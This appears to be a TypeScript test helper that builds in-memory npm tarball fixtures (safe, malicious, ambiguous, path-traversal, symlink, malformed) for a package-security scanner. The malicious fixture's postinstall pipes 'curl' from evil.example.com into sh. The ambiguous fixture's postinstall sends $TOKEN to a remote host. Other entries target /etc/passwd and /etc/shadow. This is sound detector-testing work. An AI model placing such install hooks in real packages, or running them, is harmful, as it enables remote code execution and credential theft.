import { gzipSync } from "node:zlib";

/**
 * Deterministic tarball builder for tests.
 *
 * Produces real gzipped tar archives in memory so the scanner's tar parser is
 * genuinely exercised. Fixtures are never written to disk and never executed.
 */

const BLOCK = 512;

function octal(value: number, width: number): string {
  return value.toString(8).padStart(width - 1, "0") + "\0";
}

function header(name: string, size: number, type: string, linkTarget = ""): Buffer {
  const h = Buffer.alloc(BLOCK, 0);
  h.write(name.slice(0, 100), 0, "utf8");
  h.write(octal(0o644, 8), 100, "utf8"); // mode
  h.write(octal(0, 8), 108, "utf8"); // uid
  h.write(octal(0, 8), 116, "utf8"); // gid
  h.write(octal(size, 12), 124, "utf8");
  h.write(octal(Math.floor(Date.now() / 1000), 12), 136, "utf8");
  h.write("        ", 148, "utf8"); // checksum placeholder
  h.write(type, 156, "utf8");
  if (linkTarget) h.write(linkTarget.slice(0, 100), 157, "utf8");
  h.write("ustar\0", 257, "utf8");
  h.write("00", 263, "utf8");

  // Compute and store the checksum over the header with the field blanked.
  let sum = 0;
  for (const b of h) sum += b;
  h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148, "utf8");
  return h;
}

export interface FixtureFile {
  path: string;
  content: string;
  /** '0' file, '2' symlink, '5' directory, '3' char device, '6' fifo. */
  type?: string;
  linkTarget?: string;
  /** Override the declared size (used for malformed-archive tests). */
  declaredSize?: number;
}

export function buildTarball(files: FixtureFile[]): Buffer {
  const blocks: Buffer[] = [];

  for (const f of files) {
    const type = f.type ?? "0";
    const content = f.content ? Buffer.from(f.content, "utf8") : Buffer.alloc(0);
    const declared = f.declaredSize ?? content.length;

    blocks.push(header(f.path, declared, type, f.linkTarget));
    if (content.length > 0) {
      const padded = Math.ceil(content.length / BLOCK) * BLOCK;
      const buf = Buffer.alloc(padded, 0);
      content.copy(buf);
      blocks.push(buf);
    }
  }

  // Two zero blocks terminate the archive.
  blocks.push(Buffer.alloc(BLOCK * 2, 0));
  return gzipSync(Buffer.concat(blocks));
}

/** Minimal package.json for a fixture. */
export function manifest(opts: {
  name: string;
  version: string;
  scripts?: Record<string, string>;
  dependencies?: Record<string, string>;
  deprecated?: string;
}): string {
  const pkg: Record<string, unknown> = {
    name: opts.name,
    version: opts.version,
    ...(opts.scripts ? { scripts: opts.scripts } : {}),
    ...(opts.dependencies ? { dependencies: opts.dependencies } : {}),
  };
  if (opts.deprecated) pkg.deprecated = opts.deprecated;
  return JSON.stringify(pkg, null, 2);
}

/* -------------------------------------------------------------------------- */
/* Fixture packages.                                                           */
/*                                                                             */
/* These are DATA ONLY. The malicious fixture's payload is never executed by    */
/* any test: it is inspected as bytes by the tar parser and the detectors.      */
/* -------------------------------------------------------------------------- */

/** Harmless: no lifecycle scripts, no suspicious patterns. */
export function safeFixture(): FixtureFile[] {
  return [
    {
      path: "package/package.json",
      content: manifest({
        name: "d0-safe-fixture",
        version: "1.0.0",
        dependencies: { lodash: "^4.17.21" },
      }),
    },
    {
      path: "package/index.js",
      content: [
        "'use strict';",
        "// A deliberately boring module.",
        "function add(a, b) {",
        "  return a + b;",
        "}",
        "module.exports = { add };",
        "",
      ].join("\n"),
    },
    {
      path: "package/README.md",
      content: "# d0-safe-fixture\n\nHarmless test package.\n",
    },
  ];
}

/**
 * Dangerous: a classic remote-code-execution install script.
 *
 * The payload text exists only so the detector has real bytes to match. No test
 * runs, spawns or installs this fixture.
 */
export function maliciousFixture(): FixtureFile[] {
  return [
    {
      path: "package/package.json",
      content: manifest({
        name: "d0-malicious-fixture",
        version: "1.0.0",
        scripts: {
          postinstall: "curl -s https://evil.example.com/p.sh | sh",
        },
      }),
    },
    {
      path: "package/index.js",
      content: "module.exports = {};\n",
    },
  ];
}

/**
 * Ambiguous: suspicious but inconclusive signals.
 *
 * Deliberately NOT the same as the malicious fixture. The install script here
 * touches credential material and reaches the network, which is the sort of
 * thing a legitimate CI/build helper sometimes does badly, and exactly the kind
 * of signal a human should look at. There is no remote-execution pipeline, so
 * this must land on REVIEW: never BLOCK, and never a clean ALLOW.
 *
 * DATA ONLY - never executed by any test.
 */
export function ambiguousFixture(): FixtureFile[] {
  return [
    {
      path: "package/package.json",
      content: manifest({
        name: "d0-ambiguous-fixture",
        version: "1.0.0",
        scripts: {
          postinstall:
            "sh -c 'test -f ~/.npmrc && curl -s https://telemetry.example.com/v1/register?k=$TOKEN'",
        },
      }),
    },
    {
      path: "package/index.js",
      content: [
        "// Reads configuration from the environment.",
        "const cfg = process.env.APP_CONFIG;",
        "module.exports = { cfg };",
        "",
      ].join("\n"),
    },
    {
      path: "package/scripts/build.js",
      content: "console.log('building');\n",
    },
  ];
}

/** Path traversal attempt: must be refused, never extracted. */
export function traversalFixture(): FixtureFile[] {
  return [
    { path: "package/package.json", content: manifest({ name: "trav", version: "1.0.0" }) },
    { path: "package/../../evil.js", content: "throw new Error('should never be readable');" },
    { path: "/etc/passwd", content: "root:x:0:0" },
  ];
}

/** Symlink pointing outside the archive: recorded, never followed. */
export function symlinkFixture(): FixtureFile[] {
  return [
    { path: "package/package.json", content: manifest({ name: "link", version: "1.0.0" }) },
    { path: "package/secrets", type: "2", linkTarget: "/etc/shadow", content: "" },
  ];
}

/** Valid archive whose manifest declares a size larger than the data. */
export function malformedFixture(): FixtureFile[] {
  return [
    {
      path: "package/package.json",
      content: manifest({ name: "bad", version: "1.0.0" }),
      declaredSize: 999999,
    },
  ];
}
